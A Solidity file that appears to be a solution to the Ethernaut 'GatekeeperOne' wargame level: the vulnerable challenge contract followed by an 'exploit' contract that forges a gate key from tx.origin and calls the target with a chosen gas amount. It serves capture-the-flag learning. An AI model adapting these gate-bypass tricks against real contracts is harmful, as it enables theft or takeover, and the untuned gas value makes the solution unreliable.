// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract exploit {
    GatekeeperOne target = GatekeeperOne(0x5175a2c91845B6e551eA0d2295032A93eFDEa0d2);
    bytes8 _gateKey = bytes8(uint64(uint160(address(tx.origin)))) & 0xFFFFFFFF0000FFFF;
    event logging(uint256 log);

    function attack() public {
        try target.enter{gas: 8191*3 + 256}(_gateKey) {}
        catch {}
    }
}
